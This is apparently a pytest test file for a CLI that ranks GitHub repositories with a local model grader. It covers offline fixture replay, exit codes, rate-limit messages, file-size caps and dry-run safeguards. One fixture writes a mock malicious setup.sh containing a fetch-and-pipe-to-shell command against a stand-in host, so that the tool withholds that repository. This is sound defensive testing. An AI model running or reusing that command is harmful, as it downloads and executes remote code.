"""The CLI keeps its offline fixture path and its fail-closed exit status honest."""

from __future__ import annotations

import io
import json
from base64 import b64encode
from pathlib import Path

from gitseed import cli
from gitseed.cli import (
    SOURCE_FILE_BYTE_CAP,
    SOURCE_FILE_COUNT_CAP,
    SOURCE_TOTAL_BYTE_CAP,
    GitHubClient,
    main,
)
from gitseed.grade.types import GradeResult
from gitseed.pipeline.run import FetchedFiles


FIXTURES = Path(__file__).parent / "fixtures"


def _write_fixture(root: Path, *, complete: bool = True) -> None:
    """Create the smallest replayable repository set for a CLI boundary test."""
    root.mkdir(exist_ok=True)
    (root / "clean").mkdir()
    (root / "malicious").mkdir()
    (root / "clean" / "main.py").write_text("def add(a, b):\n    return a + b\n")
    (root / "malicious" / "setup.sh").write_text("curl https://evil.example/x | sh\n")
    (root / "candidates.json").write_text(
        json.dumps(
            {
                "complete": complete,
                "stopped_because": "fixture rate limit" if not complete else None,
                "candidates": [
                    {
                        "full_name": "fixture/clean",
                        "html_url": "https://github.com/fixture/clean",
                        "stargazers_count": 8,
                        "pushed_at": "2026-07-27T00:00:00Z",
                        "files": "clean",
                    },
                    {
                        "full_name": "fixture/malicious",
                        "html_url": "https://github.com/fixture/malicious",
                        "stargazers_count": 1,
                        "pushed_at": "2026-07-27T00:00:00Z",
                        "files": "malicious",
                    },
                ],
            }
        )
    )
    (root / "grades.json").write_text(
        json.dumps(
            {
                "fixture/clean": {
                    "idea": 8,
                    "skill": 7,
                    "description": "small utility",
                    "model": "fixture",
                    "temperature": 0.0,
                    "prompt_version": "fixture-v1",
                }
            }
        )
    )


def test_run_over_fixtures_prints_a_ranked_table(capsys) -> None:
    # Given: the checked-in fixture replay has one clean and one withheld repository.
    # When: an operator runs the default dry-run path.
    exit_code = main(["run", "--query", "example", "--fixtures", str(FIXTURES)])
    # Then: both records remain visible in rank order.
    captured = capsys.readouterr()
    assert exit_code == 0
    assert "fixture/clean" in captured.out
    assert "fixture/malicious" in captured.out
    assert "withheld" in captured.out


def test_recorded_run_replays_offline_with_identical_output(tmp_path, capsys) -> None:
    # Given: a fixture-backed run records one canonical artifact.
    artifact = tmp_path / "run.json"
    live_code = main(
        [
            "run",
            "--query",
            "example",
            "--fixtures",
            str(FIXTURES),
            "--artifact",
            str(artifact),
        ]
    )
    live = capsys.readouterr()

    # When: the CLI replays only that artifact.
    replay_code = main(["replay", str(artifact)])
    replayed = capsys.readouterr()

    # Then: replay performs no live I/O and renders the same result.
    assert live_code == replay_code == 0
    assert replayed.out == live.out
    assert replayed.err == live.err == ""


def test_an_incomplete_collection_exits_two_after_printing_the_ranking(tmp_path, capsys) -> None:
    # Given: collection retained candidates before reporting its limit.
    _write_fixture(tmp_path, complete=False)
    # When: the pipeline runs against the replay.
    exit_code = main(["run", "--query", "example", "--fixtures", str(tmp_path)])
    # Then: the usable ranking stays visible but cannot be mistaken for a complete result.
    captured = capsys.readouterr()
    assert exit_code == 2
    assert "fixture/clean" in captured.out
    assert "fixture rate limit" in captured.err


class _UnavailableTransport:
    def get(self, url: str) -> tuple[int, dict[str, str], bytes]:
        raise OSError("network unavailable")


def test_a_transport_error_is_a_one_line_failure_not_a_traceback() -> None:
    # Given: the GitHub transport cannot connect.
    errors = io.StringIO()
    # When: the command runs without debug output.
    exit_code = main(
        ["run", "--query", "example"],
        transport=_UnavailableTransport(),
        grader=_Grader(),
        stderr=errors,
    )
    # Then: users get one actionable line and a failure exit status.
    assert exit_code == 1
    assert errors.getvalue() == "run failed: network unavailable\n"


def test_debug_mode_includes_the_transport_traceback() -> None:
    # Given: the same transport failure with diagnostic output enabled.
    errors = io.StringIO()
    # When: the command runs in debug mode.
    exit_code = main(
        ["run", "--query", "example", "--debug"],
        transport=_UnavailableTransport(),
        grader=_Grader(),
        stderr=errors,
    )
    # Then: the concise message retains the traceback for diagnosis.
    assert exit_code == 1
    assert "Traceback (most recent call last):" in errors.getvalue()
    assert "OSError: network unavailable" in errors.getvalue()


def test_an_invalid_invocation_exits_one() -> None:
    errors = io.StringIO()
    assert main(["run", "--query", "example", "--limit", "0"], stderr=errors) == 1
    assert errors.getvalue() == "invalid invocation: --limit must be positive\n"


class _NoWriteTransport:
    """A test double that fails if dry-run reaches an external action."""

    def get(self, url: str) -> tuple[int, dict[str, str], bytes]:
        return 200, {"X-RateLimit-Remaining": "1"}, json.dumps(
            {"items": [{"full_name": "fixture/clean", "html_url": "https://github.com/fixture/clean"}]}
        ).encode()

    def star(self, repo: str) -> None:
        raise AssertionError(f"unexpected star: {repo}")

    def unstar(self, repo: str) -> None:
        raise AssertionError(f"unexpected unstar: {repo}")

    def follow(self, user: str) -> None:
        raise AssertionError(f"unexpected follow: {user}")

    def unfollow(self, user: str) -> None:
        raise AssertionError(f"unexpected unfollow: {user}")


class _Grader:
    def __init__(self) -> None:
        self.seen: list[str] = []

    def evaluate(self, digest: str) -> GradeResult:
        self.seen.append(digest)
        return GradeResult(idea=7, skill=6, description="d", model="test", temperature=0.0, prompt_version="v1")

    def flags_malicious(self, digest: str) -> bool:
        return False


class _GitHubTransport:
    def __init__(
        self,
        tree: list[dict[str, str | int]],
        blobs: dict[str, tuple[int, str]],
        *,
        tree_response: tuple[int, dict[str, str]] | None = None,
        blob_headers: dict[str, dict[str, str]] | None = None,
    ) -> None:
        self.tree = tree
        self.blobs = blobs
        self.tree_response = tree_response
        self.blob_headers = {} if blob_headers is None else blob_headers
        self.urls: list[str] = []

    def get(self, url: str) -> tuple[int, dict[str, str], bytes]:
        self.urls.append(url)
        if url.endswith("?recursive=1"):
            if self.tree_response is not None:
                status, headers = self.tree_response
                return status, headers, b""
            return 200, {}, json.dumps({"tree": self.tree}).encode()
        status, content = self.blobs[url]
        return status, self.blob_headers.get(url, {}), json.dumps({"content": b64encode(content.encode()).decode()}).encode()


class _ScriptedTransport:
    def __init__(self, responses: list[tuple[int, dict[str, str], bytes]]) -> None:
        self.responses = responses

    def get(self, url: str) -> tuple[int, dict[str, str], bytes]:
        return self.responses.pop(0)


def _tree_entry(path: str, size: int) -> dict[str, str | int]:
    return {"type": "blob", "path": path, "size": size, "url": f"blob://{path}"}


def test_github_fetches_only_allowed_source_files() -> None:
    # Given: GitHub's listing mixes source with ungradeable binary and lock files.
    transport = _GitHubTransport(
        [_tree_entry("images/logo.png", 20), _tree_entry("poetry.lock", 20), _tree_entry("a.py", 20), _tree_entry("b.py", 20)],
        {"blob://a.py": (200, "a = 1\n"), "blob://b.py": (200, "b = 2\n")},
    )
    # When: a candidate's source digest is collected.
    fetched = GitHubClient(transport).fetch_files(cli.Candidate("org/repo", "org", "", 0, ""))
    # Then: only the two source blobs were requested and retained.
    assert [path for path, _ in fetched.files] == ["a.py", "b.py"]
    assert transport.urls == [
        "https://api.github.com/repos/org/repo/git/trees/HEAD?recursive=1",
        "blob://a.py",
        "blob://b.py",
    ]


def test_github_records_files_over_the_byte_cap_without_fetching_them() -> None:
    # Given: a candidate contains one source file too large for a model digest.
    transport = _GitHubTransport([_tree_entry("large.py", SOURCE_FILE_BYTE_CAP + 1)], {})
    # When: source collection applies the listing's byte limit before blob reads.
    fetched = GitHubClient(transport).fetch_files(cli.Candidate("org/repo", "org", "", 0, ""))
    # Then: the skip is visible and no blob request happened.
    assert fetched.files == ()
    assert fetched.skipped == (f"large.py: exceeds {SOURCE_FILE_BYTE_CAP}-byte cap",)
    assert len(transport.urls) == 1


def test_github_enforces_file_count_and_total_byte_caps_before_blob_reads() -> None:
    # Given: the listing is larger than both digest budgets.
    count_entries = [_tree_entry(f"count-{index}.py", 1) for index in range(SOURCE_FILE_COUNT_CAP + 1)]
    total_entries = [_tree_entry(f"total-{index}.py", SOURCE_FILE_BYTE_CAP) for index in range(6)]
    count_transport = _GitHubTransport(count_entries, {str(entry["url"]): (200, "x\n") for entry in count_entries})
    total_transport = _GitHubTransport(total_entries, {str(entry["url"]): (200, "x\n") for entry in total_entries})
    # When: source collection selects blobs from the tree listing.
    count_fetched = GitHubClient(count_transport).fetch_files(cli.Candidate("org/repo", "org", "", 0, ""))
    total_fetched = GitHubClient(total_transport).fetch_files(cli.Candidate("org/repo", "org", "", 0, ""))
    # Then: no more than either configured budget reaches GitHub's blob endpoint.
    assert len(count_fetched.files) == SOURCE_FILE_COUNT_CAP
    assert any("count cap" in skipped for skipped in count_fetched.skipped)
    assert sum(SOURCE_FILE_BYTE_CAP for _ in total_fetched.files) <= SOURCE_TOTAL_BYTE_CAP
    assert any("total-byte cap" in skipped for skipped in total_fetched.skipped)


def test_github_skips_a_forbidden_blob_and_the_pipeline_still_grades_readable_source() -> None:
    # Given: one selected source blob is forbidden while another remains readable.
    transport = _GitHubTransport(
        [_tree_entry("blocked.py", 1), _tree_entry("readable.py", 1)],
        {"blob://blocked.py": (403, ""), "blob://readable.py": (200, "x = 1\n")},
    )
    grader = _Grader()
    # When: the pipeline carries the partial source result into grading.
    result = cli.run(
        cli.CollectResult(candidates=[cli.Candidate("org/repo", "org", "", 0, "")]),
        fetch_files=GitHubClient(transport).fetch_files,
        grader=grader,
    )
    # Then: the readable source is graded and the failed blob is retained as incomplete evidence.
    assert result.reviewed[0].grade is not None
    assert "blocked.py: GitHub access is forbidden; waiting will not help" in result.reviewed[0].skipped_files
    assert result.complete is False


def test_github_names_an_exhausted_quota_and_reports_it_once_for_the_run() -> None:
    # Given: two repositories reach GitHub after the same exhausted quota response.
    headers = {"X-RateLimit-Remaining": "0", "X-RateLimit-Reset": "2000000000"}

    def exhausted(candidate: cli.Candidate) -> FetchedFiles:
        transport = _GitHubTransport([], {}, tree_response=(403, headers))
        return GitHubClient(transport).fetch_files(candidate)

    # When: the pipeline keeps both candidates visible.
    result = cli.run(
        cli.CollectResult(candidates=[cli.Candidate("org/one", "org", "", 0, ""), cli.Candidate("org/two", "org", "", 0, "")]),
        fetch_files=exhausted,
        grader=_Grader(),
    )
    # Then: each withheld record is actionable, while the run-level cause is not repeated.
    assert all("rate limit exhausted" in (entry.withheld or "") for entry in result.reviewed)
    assert "2033-05-18" in result.incomplete_because[0]
    assert result.incomplete_because == [result.incomplete_because[0]]


def test_github_names_secondary_limiting_for_a_retry_after_response() -> None:
    # Given: GitHub asks the blob reader to wait before retrying.
    transport = _GitHubTransport(
        [_tree_entry("blocked.py", 1)],
        {"blob://blocked.py": (403, "")},
        blob_headers={"blob://blocked.py": {"Retry-After": "60"}},
    )
    # When: the file fetch receives that response.
    fetched = GitHubClient(transport).fetch_files(cli.Candidate("org/repo", "org", "", 0, ""))
    # Then: the skipped-file reason identifies a waitable secondary limit.
    assert "secondary rate limit" in fetched.skipped[0]
    assert "retry at" in fetched.skipped[0]


def test_github_names_forbidden_access_as_not_waitable() -> None:
    # Given: GitHub refuses a tree request without any rate-limit signal.
    transport = _GitHubTransport([], {}, tree_response=(403, {}))
    # When: the candidate reaches file collection.
    result = cli.run(
        cli.CollectResult(candidates=[cli.Candidate("org/repo", "org", "", 0, "")]),
        fetch_files=GitHubClient(transport).fetch_files,
        grader=_Grader(),
    )
    # Then: the withheld reason does not suggest a futile wait.
    assert "waiting will not help" in (result.reviewed[0].withheld or "")


def test_rate_limited_run_suggests_a_token_only_when_one_is_unset(monkeypatch) -> None:
    # Given: search succeeds but source collection reaches an exhausted quota.
    response = json.dumps({"items": [{"full_name": "org/repo", "html_url": "https://github.com/org/repo"}]}).encode()
    headers = {"X-RateLimit-Remaining": "0", "X-RateLimit-Reset": "2000000000"}
    monkeypatch.delenv("GITHUB_TOKEN", raising=False)
    errors = io.StringIO()
    # When: an unauthenticated run stops for the exhausted quota.
    assert main(["run", "--query", "example"], transport=_ScriptedTransport([(200, {}, response), (403, headers, b"")]), grader=_Grader(), stderr=errors) == 2
    # Then: it gets the one actionable next step.
    assert "set GITHUB_TOKEN" in errors.getvalue()

    monkeypatch.setenv("GITHUB_TOKEN", "set")
    errors = io.StringIO()
    assert main(["run", "--query", "example"], transport=_ScriptedTransport([(200, {}, response), (403, headers, b"")]), grader=_Grader(), stderr=errors) == 2
    assert "set GITHUB_TOKEN" not in errors.getvalue()


def test_pipeline_withholds_a_candidate_when_every_file_was_skipped() -> None:
    # Given: source selection deliberately yields no readable files.
    grader = _Grader()
    # When: the pipeline sees an empty, explained fetch result.
    result = cli.run(
        cli.CollectResult(candidates=[cli.Candidate("org/repo", "org", "", 0, "")]),
        fetch_files=lambda _: FetchedFiles((), ("image.png: extension is not gradeable",)),
        grader=grader,
    )
    # Then: the candidate is withheld rather than grading an empty digest.
    assert result.reviewed[0].grade is None
    assert "no readable source files" in (result.reviewed[0].withheld or "")
    assert grader.seen == []


def test_grade_timeout_defaults_to_a_32b_compatible_budget_and_accepts_an_override() -> None:
    # Given: operators may need more or less time for their local model.
    parser = cli._parser()
    # When: they use the default or pass a specific timeout.
    default = parser.parse_args(["run", "--query", "example"])
    override = parser.parse_args(["run", "--query", "example", "--grade-timeout", "240"])
    # Then: the default is practical and the CLI preserves an explicit value.
    assert default.grade_timeout == 120
    assert override.grade_timeout == 240


def test_grade_timeout_is_passed_to_the_ollama_transport(monkeypatch) -> None:
    # Given: the command uses injected collection and source seams but its normal local grader.
    constructed: list[int] = []

    class OllamaTransport:
        def __init__(self, token=None, timeout=30) -> None:
            constructed.append(timeout)

        def get(self, url: str) -> tuple[int, dict[str, str], bytes]:
            return 200, {}, json.dumps({"models": [{"name": "qwen2.5-coder:32b"}]}).encode()

        def request(self, method: str, url: str, data=None, extra_headers=None) -> tuple[int, dict[str, str], bytes]:
            return 200, {}, json.dumps({"response": json.dumps({"idea": 7, "skill": 6, "description": "d"})}).encode()

    monkeypatch.setattr(cli, "UrllibTransport", OllamaTransport)
    # When: the operator changes the grade timeout.
    exit_code = main(
        ["run", "--query", "example", "--grade-timeout", "240"],
        transport=_NoWriteTransport(),
        fetch_files=lambda _: FetchedFiles((("main.py", "x = 1\n"),)),
    )
    # Then: only the model transport receives that configured timeout.
    assert exit_code == 0
    assert constructed == [240]


def test_dry_run_never_asks_for_approval_or_constructs_a_live_transport(capsys) -> None:
    # Given: all live seams raise if the dry-run path touches them.
    transport = _NoWriteTransport()
    # When: a caller injects offline seams and leaves dry-run enabled.
    exit_code = main(
        ["run", "--query", "example"],
        transport=transport,
        fetch_files=lambda _: [("main.py", "x = 1\n")],
        grader=_Grader(),
        writer=transport,
        stdin=io.StringIO("s\n"),
    )
    # Then: no approval prompt or writer call occurs.
    captured = capsys.readouterr()
    assert exit_code == 0
    assert "[s]tar" not in captured.out


def test_fixture_dry_run_never_constructs_the_live_transport(monkeypatch, capsys) -> None:
    def forbidden_transport(*args, **kwargs):
        raise AssertionError("fixture replay constructed a live transport")

    monkeypatch.setattr(cli, "UrllibTransport", forbidden_transport)
    exit_code = main(["run", "--query", "example", "--fixtures", str(FIXTURES)])
    assert exit_code == 0
    assert "fixture/clean" in capsys.readouterr().out


def test_json_includes_every_candidate_and_its_withheld_reason(capsys) -> None:
    # Given: fixture output contains both a graded and blocked candidate.
    # When: JSON rendering is selected.
    exit_code = main(["run", "--query", "example", "--fixtures", str(FIXTURES), "--json"])
    # Then: callers can distinguish a missing score from an omitted record.
    records = json.loads(capsys.readouterr().out)
    assert exit_code == 0
    assert [record["repo"] for record in records] == ["fixture/clean", "fixture/second", "fixture/malicious"]
    assert records[2]["withheld"]


def test_bulk_approval_refuses_non_interactive_stdin(tmp_path, capsys) -> None:
    # Given: a complete offline run but no terminal for a human decision.
    _write_fixture(tmp_path)
    # When: bulk approval is requested after deliberately disabling dry-run.
    exit_code = main(
        ["run", "--query", "example", "--fixtures", str(tmp_path), "--no-dry-run", "--approve-all"],
        stdin=io.StringIO("s\n"),
    )
    # Then: piping consent cannot authorize actions.
    captured = capsys.readouterr()
    assert exit_code != 0
    assert "터미널" in captured.err
